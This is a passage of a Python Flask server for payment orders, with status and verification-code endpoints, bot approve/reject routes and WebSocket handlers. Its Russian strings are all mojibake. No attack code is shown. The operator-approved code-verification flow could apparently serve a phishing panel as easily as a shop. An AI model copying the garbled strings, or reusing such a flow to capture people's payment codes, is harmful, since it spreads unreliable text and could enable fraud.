            api_status = status_mapping.get(order['status'], 'pending')
            
            result = {
                'status': api_status,
                'order_id': order_id
            }
            
            if api_status == 'verification' and order.get('verification_type'):
                result['verificationType'] = order['verification_type']
            
            return jsonify(result)
        else:
            return jsonify({'error': '–ü–ª–∞—Ç–µ–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω'}), 404
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–∞—Ç—É—Å–∞ –ø–ª–∞—Ç–µ–∂–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

@app.route('/api/payment/verify/<order_id>', methods=['POST'])
def verify_payment(order_id):
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–ª–∞—Ç–µ–∂–∞"""
    try:
        data = request.get_json()
        code = data.get('code')
        
        if not code:
            return jsonify({'error': '–ö–æ–¥ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω'}), 400
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –º–µ—Ç–æ–¥ verify_code
        success = order_manager.verify_code(order_id, code)
        
        if success:
            logger.info(f"–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–ª–∞—Ç–µ–∂–∞ {order_id} –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ")
            return jsonify({'success': True, 'message': '–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ'})
        else:
            logger.warning(f"–ù–µ–≤–µ—Ä–Ω–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–ª—è –ø–ª–∞—Ç–µ–∂–∞ {order_id}")
            return jsonify({'error': '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏'}), 400
            
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–ª–∞—Ç–µ–∂–∞: {e}")
        return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

# WebSocket —Å–æ–±—ã—Ç–∏—è
@socketio.on('connect')
def handle_connect():
    logger.info(f"–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω: {request.sid}")
    connected_clients.add(request.sid)
    emit('connected', {'message': '–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–µ–Ω: {request.sid}")
    connected_clients.discard(request.sid)

@socketio.on('join_order')
def handle_join_order(data):
    """–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –Ω–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –∑–∞–∫–∞–∑–∞"""
    order_id = data.get('order_id')
    if order_id:
        # –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –±—ã –±—ã–ª–∞ –ª–æ–≥–∏–∫–∞ join –∫ –∫–æ–º–Ω–∞—Ç–µ
        logger.info(f"–ö–ª–∏–µ–Ω—Ç {request.sid} –ø–æ–¥–ø–∏—Å–∞–ª—Å—è –Ω–∞ –∑–∞–∫–∞–∑ {order_id}")
        emit('joined_order', {'order_id': order_id})

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': '–°—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞'}), 500

if __name__ == '__main__':
    logger.info("–ó–∞–ø—É—Å–∫ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞...")
    logger.info("–î–æ—Å—Ç—É–ø–Ω—ã–µ API endpoints:")
    logger.info("  GET  /                     - –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞")
    logger.info("  POST /api/submit_order     - –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–∫–∞–∑–∞")
    logger.info("  POST /api/verify_code      - –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è")
    logger.info("  GET  /api/bot/orders       - –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–∫–∞–∑–æ–≤ –¥–ª—è –±–æ—Ç–∞")
    logger.info("  POST /api/bot/approve/<id> - –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∑–∞–∫–∞–∑–∞")
    logger.info("  POST /api/bot/reject/<id>  - –û—Ç–∫–ª–æ–Ω–µ–Ω–∏–µ –∑–∞–∫–∞–∑–∞")
    logger.info("  GET  /api/bot/order/<id>   - –î–µ—Ç–∞–ª–∏ –∑–∞–∫–∞–∑–∞")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä
    port = int(os.environ.get('PORT', 5000))
    host = os.environ.get('HOST', '0.0.0.0')
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    socketio.run(app, host=host, port=port, debug=debug, allow_unsafe_werkzeug=True)
